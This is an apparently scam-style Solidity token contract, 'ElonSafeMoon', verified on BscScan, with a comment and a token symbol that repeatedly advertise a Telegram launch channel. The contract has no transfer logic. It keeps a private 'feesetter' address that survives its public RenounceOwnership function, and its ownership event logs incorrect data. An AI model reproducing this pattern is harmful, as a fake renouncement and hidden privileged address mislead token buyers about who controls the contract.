/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

/**
                           Launch in 15 min 
                          Vocal Chat is OPEN
Vocal Chat is OPEN / Launch in 15 min      https://t.me/ElonSafeMoonBSC                    
Telegram: https://t.me/ElonSafeMoonBSC     https://t.me/ElonSafeMoonBSC
Vocal Chat is OPEN / Launch in 15 min      https://t.me/ElonSafeMoonBSC
Telegram: https://t.me/ElonSafeMoonBSC     https://t.me/ElonSafeMoonBSC
Vocal Chat is OPEN / Launch in 15 min      https://t.me/ElonSafeMoonBSC          
Telegram: https://t.me/ElonSafeMoonBSC     https://t.me/ElonSafeMoonBSC
Vocal Chat is OPEN / Launch in 15 min      https://t.me/ElonSafeMoonBSC
Telegram: https://t.me/ElonSafeMoonBSC

https://www.elonsafemoon.com/
*/
pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract BEP20 {
}
contract ElonSafeMoon is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
	symbol = "https://t.me/ElonSafeMoonBSC";
    name = "ESM";
    decimals = 2;
        totalSupply = 10000000000000000;
	balances[msg.sender] = totalSupply;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));

    }
}